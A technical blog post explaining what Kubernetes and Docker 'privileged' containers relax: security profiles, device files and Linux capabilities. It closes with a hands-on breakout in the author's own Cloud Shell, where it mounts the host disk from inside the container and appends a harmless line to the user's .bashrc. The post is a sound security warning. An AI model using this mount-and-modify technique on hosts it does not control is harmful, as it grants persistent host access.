+++
title = "Privileged Containers Aren't Containers"
date = "2019-09-23"
+++

## Disabling security features

Applications that interact with host systems such as network plugins or storage drivers can have issues when run in a container, requesting access that’s been restricted by the kernel. For these cases, container runtimes have an out to disable these security features and let the process access the host. In Kubernetes this is achieved with the “privileged” security context field:

```
containers:
  - name: flannel
    image: quay.io/coreos/flannel:v0.11.0-amd64
    command:
    - "/opt/bin/flanneld"
    - "--ip-masq"
    - "--kube-subnet-mgr"
    - "--iface=$(POD_IP)"
    env:
      - name: POD_IP
        valueFrom:
          fieldRef:
            fieldPath: status.podIP
    securityContext:
      privileged: true
```

“privileged” doesn’t correspond to a single Linux primitive. Originally, this was just whatever Docker’s “--privileged” flag implemented. While the container still runs in its own [Linux namespaces and root filesystems](../containers-from-scratch), many security restrictions are relaxed.

For example, privileged containers don’t run with a SELinux or AppArmor context:

```
$ docker run --rm alpine:latest cat /proc/self/attr/current
docker-default (enforce)
$ docker run --privileged --rm alpine:latest cat /proc/self/attr/current
unconfined
```

The container is also provisioned with extensive access to the host. Normally containers are only given the bare-minimum device files to operate, such as stdout, stderr, stdin, /dev/null, etc.

```
$ docker run -it --rm alpine:latest ls /dev
console  fd       mqueue   ptmx     random   stderr   stdout   urandom
core     full     null     pts      shm      stdin    tty      zero
```

Privileged containers are mounted with all device files:

```
$ docker run -it --privileged --rm alpine:latest ls /dev
autofs              mapper              sda5
bsg                 md0                 sda6
console             memory_bandwidth    sda7
core                mqueue              sda8
cpu                 net                 sda9
cpu_dma_latency     network_latency     shm
dm-0                network_throughput  stderr
fd                  null                stdin
full                nvram               stdout
fuse                port                tpm0
hpet                ppp                 tpmrm0
hwrng               ptmx                tty
input               pts                 ttyS0
kmsg                random              ttyS1
loop-control        rtc0                ttyS2
loop0               sda                 ttyS3
loop1               sda1                uinput
loop2               sda10               urandom
loop3               sda11               vsock
loop4               sda12               zero
loop5               sda2                zram0
loop6               sda3
loop7               sda4
```

What makes a privileged container truly dangerous are the [Linux capabilities][capabilities] granted to it. Capabilities are the set of powers that compose “root” such as listening on lower ports, killing other processes, or changing file ownership. In a regular container, processes are severely restricted:

```
$ docker run --rm alpine:latest /bin/sh -c 'apk update && apk add libcap && capsh --print'
# ...
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

A privileged container has all capabilities:

```
$ docker run --privileged --rm alpine:latest /bin/sh -c 'apk update && apk add libcap && capsh --print'
# ...
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Ambient set =
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

CAP_SYS_ADMIN, the catch-all for privileged administrative actions, is the [poster child][cap-sys-admin] for dangerous capabilities. This flag lets a process set disk quotas, mount file systems, exceed the number of max open files, manipulate namespaces (the list goes on).

## Breaking out

Let’s put this together and break out of a privileged container. To demonstrate, we’ll run a privileged container in [Google’s Cloud Shell][cloud-shell] and gain access to the host’s filesystem.

In cloud environments, data is encrypted at rest but often exposed to the VM as an unencrypted filesystem (it’d be a pain if you had to manually enter a decryption password every time a VM booted). For Cloud Shell, the /home directory is exposed by /dev/sdb1, an attached device that persists between reboots and re-images.

Within a privileged container, a process can generate a device node for that block device, mount it into the container, and modify the user’s ~/.bashrc: 

```
$ docker run --privileged -it --rm alpine:latest
/ # apk update && apk add util-linux
# ...
/ # lsblk
NAME      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda         8:0    0   45G  0 disk
├─sda1      8:1    0 40.9G  0 part /etc/hosts
├─sda2      8:2    0   16M  0 part
├─sda3      8:3    0    2G  0 part
│ └─vroot 253:0    0  1.2G  1 dm
├─sda4      8:4    0   16M  0 part
├─sda5      8:5    0    2G  0 part
├─sda6      8:6    0  512B  0 part
├─sda7      8:7    0  512B  0 part
├─sda8      8:8    0   16M  0 part
├─sda9      8:9    0  512B  0 part
├─sda10     8:10   0  512B  0 part
├─sda11     8:11   0    8M  0 part
└─sda12     8:12   0   32M  0 part
sdb         8:16   0    5G  0 disk
└─sdb1      8:17   0    5G  0 part
zram0     252:0    0  768M  0 disk [SWAP]
/ # mknod /dev/sdb1 block 8 17
/ # mkdir /mnt/host_home
/ # mount /dev/sdb1 /mnt/host_home
/ # echo 'echo "Hello from container land!" 2>&1' >> /mnt/host_home/eric_chiang_m/.bashrc
```

Logging back into the host, you’d be greeted with a fun message:


```
Welcome to Cloud Shell! Type "help" to get started.
To set your Cloud Platform project in this session use “gcloud config set project [PROJECT_ID]”
Hello from container land!
eric_chiang_m@cloudshell:~$
```


It’s important to remember that this isn’t a container escape, it’s working as intended. Privileged containers offer no security separation between the container and the host.

So take care when enabling this feature. Your container might not be a container.

[cap-sys-admin]: https://lwn.net/Articles/486306/
[capabilities]: http://man7.org/linux/man-pages/man7/capabilities.7.html
[cloud-shell]: https://cloud.google.com/shell/
